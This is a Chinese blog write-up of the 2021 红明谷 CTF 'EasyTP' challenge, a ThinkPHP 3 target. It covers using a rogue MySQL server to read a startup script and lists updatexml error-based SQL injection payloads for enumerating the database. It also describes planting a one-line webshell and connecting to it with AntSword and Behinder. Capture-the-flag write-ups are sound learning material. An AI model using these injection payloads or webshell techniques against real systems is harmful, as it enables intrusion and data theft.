---
title: '[红明谷CTF 2021]EasyTP'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-04-27 11:50:38
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg
---
BUU上有点问题的题目还是写一篇博客吧，网上找了找都没人写。
tp3这个链的分析在我的另一篇博客里，不过更推荐看这个：
https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt
了解原理之后开始做题。

开启恶意MySQL服务器，设置读取文件为/start.sh

    FLAG_PATH=/var/www/html/tp3.sql
    FLAG_MODE=M_SQL
    if [ ${ICQ_FLAG} ];then
        case $FLAG_MODE in
                "M_ECHO")
                            echo -n ${ICQ_FLAG} > ${FLAG_PATH}
                            FILE_MODE=755
                            chmod ${FILE_MODE} ${FLAG_PATH}
                            ;;
                 "M_SED")
                            #sed -i "s/flag{x*}/${ICQ_FLAG}/" ${FLAG_PATH}
                            sed -i -r "s/flag\\{.*\\}/    ${ICQ_FLAG}/" ${FLAG_PATH}
                            ;;
                 "M_SQL")
                             sed -i -r "s/flag\\{.*\\}/${ICQ_FLAG}/" ${FLAG_PATH}
                             mysql -uroot -proot < ${FLAG_PATH}
                             rm -f ${FLAG_PATH}
                             ;;
                                *)
                             ;;
               esac
                  echo [+] ICQ_FLAG OK\n    unset ICQ_FLAG\nelse\n    echo [!] no ICQ_FLAG\nfi\n

很乱，懒得整理了。总之flag在数据库里，用户名密码为root root。用户名密码为root root。用户名密码为root root。这里buu应该是将比赛时错误的环境修复过来了。（比赛时是123456

报错注入：

    updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1)
    //在这一步查出库是test后将poc开头那里database改为test
    updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='test'),1,32),0x7e),1)
 
    updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='f1ag'),1,32),0x7e),1)
    //这一步无法执行，后面就知道原因了。

我在最后一步读取flag的时候一直是白屏，注了好久还是白屏，实在想不明白原因。
只能换getshell了，写个一句话，蚁剑连上发现没法操作数据库，换冰蝎，传个冰蝎马连上去：mysql://root:root@127.0.0.1:3306/mysql
然而这里直接查看flag也是看不到的，必须要导出来才能查看。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210427154948.png)

注了一晚上结果是不能注。。。绝了

